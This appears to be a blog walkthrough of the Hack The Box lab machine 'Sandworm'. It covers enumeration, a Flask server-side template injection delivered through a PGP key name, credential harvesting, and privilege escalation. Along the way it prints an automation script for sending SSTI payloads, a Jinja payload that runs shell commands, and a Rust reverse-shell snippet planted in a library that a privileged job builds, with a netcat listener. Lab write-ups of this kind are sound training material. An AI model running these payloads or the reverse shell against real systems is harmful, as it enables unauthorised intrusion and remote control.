---
author: cruxqsec
date: '2023-08-20'
description: Medium difficulty Linux machine from Hack the box
summary: Medium difficulty Linux machine from Hack the box
tags: ["htb", "linux", "ssti", "cve"]
title: HTB Sandworm
---

## Enumeration

First we start with a port scan:

```bash
sudo nmap -sC -sV 10.10.11.218 -oA nmap/nmap
```

![image 1](img/1.png)

Then we check the website and see it redirects us to `ssa.htb`.  We get redirected to `https://ssa.htb`.
We add it to `/etc/hosts` and run <kbd>`nmap`</kbd> again just this time we don't specify the IP but the domain 

{{< alert >}}
  
<kbd>`nmap`</kbd> will use additional scripts for the domain.


{{< /alert >}}

Meanwhile we will check the site we run:

```bash
sudo nmap -p- ssa.htb -T4 -oA nmap/nmap-ssa-all` to scan all ports. We find no more open ports.
```

Then we can try virtual host enumeration with <kbd>`gobuster`</kbd> :

```bash
gobuster vhost -u https://ssa.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k
```

We also get no results.

Next we can try to bruteforce the directories. We could also use <kbd>`gobuster`</kbd> but 
I just used <kbd>`feroxbuster`</kbd>. 

```bash
feroxbuster -u https://ssa.htb/ -k
``` 

![image 2](img/2.png)

### Website

Looking at the website we can find that at the bottom it says `Powered by Flask™ ` which probably signals 
the website is using `Python Flask`. 

From the <kbd>`feroxbuster`</kbd> enumeration we can now check the endpoints.

`/admin`, `/view`, `/logout` redirects to a login page so we can assume you have to be logged in to view them.

`/login` is a simple login page.

`/about` simple about page.

`/pgp` we can download the public PGP key and import it with 
```bash
gpg --import key-file
``` 

We get an email  `atlas@ssa.htb`  which is also mentioned in the `/guide`.

`/contact` has a form in which we can send a message encrypted with their public key.

`/guide` has a guide and many forms for experiment with decrypting, encrypting, validating signatures and more.  

I tried a simple [XSS](https://owasp.org/www-community/attacks/xss/) by encrypting `<h1> Hello world </h1>` and seeing if the HTML will parse, but it didn't work.
Signature give this message: 

![image 3](img/3.png)

`/process` interestingly only allows `POST` requests but after we try to send it we get a 400 Bad Request.
So we probably have to figure out how to correctly send it.

### How does the site work

As we discerned earlier this site is probably using `Python` and the `Flask Web framework`.
We don't have any version information. We could also presuppose some things: firstly that there is database,
because we have a login and secondly that there could be a templating engine being used.
So there are 2 logical attacks that could follow from this - SQL Injection and Server side template injection (SSTI).
We also see in the `/login` page we are getting a 

```
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.ZU0zrg.tx3vcFTUmmremG-uGUzJo7qiCTk
``` 

Let's check it using it [jwt.io](https://jwt.io)  I get the following result:

![image 4](img/4.png)

So there seems to be a message but the site says the JSON token is invalid as is it's signature.

I found this Python module `flask-unsign` which does exactly what I was hoping for.
If I give it the session cookie to decode it outputs:

```bash
$ flask-unsign --decode --cookie \ "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.ZU9bXQ._r0fMGNanB0524wEH9qLG8rtjJg"
output: {'_flashes': [('message', 'Please log in to access this page.')]}
```


#### SQL Injection

There are many possibilities for which database engine is being used.
`MySQL` or `MariaDB`, `SQLite` could be used or perhaps `PostgresSQL`.
Or maybe some other. We don't know. Using `sql` map on all the meaningful sites doesn't yield any results.

#### SSTI

`JINJA`, `Mako` or `Tornado` could be used as a templating engine.
When testing the `Signature Validation` under `/guide` we come across a prompt that I pasted earlier
with which we get our `gpg` key name reflected. So if we try to input the {{7 * 7}} as the name we get this:

![image 5](img/5.png)

## Foothold

So I proceeded by writing a script that automates the process of generating a key with <kbd>`gpg --key-generate`</kbd>
and the payload inside the name, getting the public key, getting the signed clear text 
with <kbd>`gpg -u key_id --clear-sign --armor`</kbd> and then sending the `POST` request to `/process`.

```python
import subprocess
import os
import requests

url = "https://ssa.htb/process"
proxies = { "https" : "http://127.0.0.1:8080" }

def gen_key(payload):
    #we have to create a file with all the key info and then generate it
    cmd = f"""
        echo "Key-Type: RSA" > key-details;
        echo "Key-Length: 4096" >> key-details;
        echo "Name-Real: {payload}" >> key-details;
        echo "Name-Email: your_email@example.com" >> key-details;
        echo "Expire-Date: 0" >> key-details;
        echo "%no-ask-passphrase" >> key-details;
        echo "%no-protection" >> key-details;
        gpg --batch --gen-key key-details
        """

    # prints response to stderr for some reason
    result = subprocess.run(cmd, capture_output=True, shell=True, text=True).stderr
    # we get the key_id from gpg output
    key_id =  result.split(".")[-2][2:]
    return key_id

def get_clear_sig(key_id):
    os.system(f"gpg -u {key_id} --clear-sign --armor file.txt")
    result = subprocess.run(f"cat file.txt.asc",capture_output=True, shell=True, text=True).stdout
    os.system("rm file.txt.asc")

    return result

def get_public_key(key_id):
    cmd = f"gpg -u {key_id} --export --armor"
    result = subprocess.run(cmd, capture_output=True, shell=True, text=True).stdout
    return result

def delete_key(key_id):
    os.system(f"gpg --batch --yes --delete-secret-and-public-key {key_id}")

while True:

    payload = input("$ ")

    # create key with SSTI payload
    key_id = gen_key(payload)

    # get public key
    pub_key = get_public_key(key_id)

    # get clear sign signature
    sign_text = get_clear_sig(key_id)

    data = { 'signed_text' : sign_text, 'public_key' : pub_key }

    req = requests.post(url, data=data, proxies=proxies, verify=False)

    if req.status_code == 200:
        print(req.content.decode('utf-8'))
        print("----------------------------------")
    else:
        print("http error")

    delete_key(key_id)
```


By sending `{{config}}` as the payload we get the Flask configuration data in which we get 
the `SESSION SECRET: 91668c1bc67132e3dcfb5b1a3e0c5c21` and the MySQL 
information `mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA`. 

We can also get [RCE](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/remote-code-execution/) with :

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
``` 

So we can get the users that are in the box by reading `/etc/passwd` :

![image 6](img/6.png)

So then we can make a `users.txt` with the usernames and try 

```bash
crackmapexec ssh ssa.htb -u users.txt -p 'GarlicAndOnionZ42'
```

to SSH into the box. It fails. But we can upload a reverse shell that is `Base64` encoded and we get onto the box.

## Privilege escalation

So now we're on the box. We are the user `atlas` and right from the start we see we are in a limited environment.
There are no basic commands such as <kbd>`file`</kbd>, <kbd>`rm`</kbd> and others. 
We can't even normally print the environment variables, because there is no <kbd>`env`</kbd> command.
So we have to `cat /proc/self/environ` to get the environmet variables.
And we can see from this variable `container=firejail` that we are probably in a <kbd>`firejail`</kbd> sandbox.

### Breaking out of Firejail

[Firejail](https://github.com/netblue30/firejail) is a security sandbox tool designed to improve the security of 
applications by isolating them in a sandbox environment with less functionality.
I tried to run a `firejail` [exploit](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) but to no avail 
as we have really limited binary access and we can't even find out what `firejail` version we are running.  

So I just started to search around and eventualy I stumbled accross this file in the home directory
<kbd>`~/.config/httpie/sessions/localhost_5000/admin.json`</kbd>. 

Inside it I found the password for the user `silentobserver:quietLiketheWind22`. 
Trying to SSH in the box we get in.

### Silent observer

So now that we're the `silentobserver` user we have a normal shell and we are not in <kbd>`firejail`</kbd> sandbox 
anymore. So first I ran <kbd>`linpeas.sh`</kbd> and <kbd>`pspy64`</kbd>.


Then I checked the database with the credentials we got 
earlier and found 2 hashes. Cracking the hashes is not as straightforward as it seems because the hashes are 
somewhat custom, made with `werkzeug` python library. 
But I found [this](https://github.com/AnataarXVI/Werkzeug-Cracker) repository which has a  custom cracker.
I just left it running in the background while I do other things.

<kbd>`pspy64`</kbd> outputs some interesting stuff:

![image 7](img/7.png)

So we see there is a custom script being run by root at `/root/Cleanup/clean.sh`.  
I tried to upload a custom binary to a writeable `$PATH` which is inside  
`/home/silentobserver/.local/bin` and 
name the binary `sleep` as we see `sleep` being executed - but it doesn't work.


We see <kbd>`cargo`</kbd> is being run which is a Rusts package manager.
Then we see another program being run which is <kbd>`tipnet`</kbd>.
Searching for it online doesn't give any meaningful results so this may be a custom program.
We can use `scp -r silentobserver@ssa.htb:/opt/tipnet .` to download the build scripts and the source code.

The download took too long so I just looked a the source code at `/opt/tipnet/src/main.rs`.
We can immediately find database it connects to by looking at the `connect_to_db()` function.
We find the basic information including the database password 

`mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream`.

We also see that there is a compilation going with <kbd>`rustc`</kbd> where the user `atlas` compiles the
`opt/tipnet/src/main.rs` and `/opt/crates/logger/src/lib.rs` files into a binary inside
`/opt/tipnet/target/debug/tipnet` with SUID of the user `atlas`. We can then add code to the `lib.rs`:

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

	// this goes inside the log function
    // reverse shell
    let s = TcpStream::connect("my-ip:3001").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
```

Then we set up a listener on our machine

```bash
nc -lvnp 3001
```

and this spawns a shell. 
If we execute <kbd>`id`</kbd> we can see we are the `atlas` user and we are in the `jailer` group. 
If we remember earlier I tried to execute a <kbd>`firejail`</kbd> exploit which didn't work because we were inside 
a sandbox. Now we can navigate to `/usr/local/bin/firejail` and run `firejail --version`.
It's version is `0.9.68` which is vulnerable to the earlier exploit. 
I upload it and follow its instructions and we get root. <kbd>`Pwned!`</kbd>

## Post exploitation

Now we are `root`. Let's try a few things:

1. Dump SSH credentials
3. Try to crack the hashes we got earlier
4. Read the source code of the webapp and it's configuration (including firejail)

### Reading the source code

I was sloppy and missed that there is another passphrase in the source code inside `app.py`. It's the PGP private key password `$M1DGu4rD$`. This password is the password for the user `Odin` that was found inside the database with the hashes. 

![image 8](img/8.png)

### Cracking the passwords

Cracking the hashes proves quite difficult, <kbd>`hashcat`</kbd> and <kbd>`john`</kbd> have no formats for this hash.
Trying to reformat it also didn't work. But using `werkzeug-cracker` worked. 
But this script is slow so if I didn't already know the passwords it would take quite a long time.

### Dumping the credentials

Using `strace` we can see the password that was input. Maybe we should check some script or write our own.

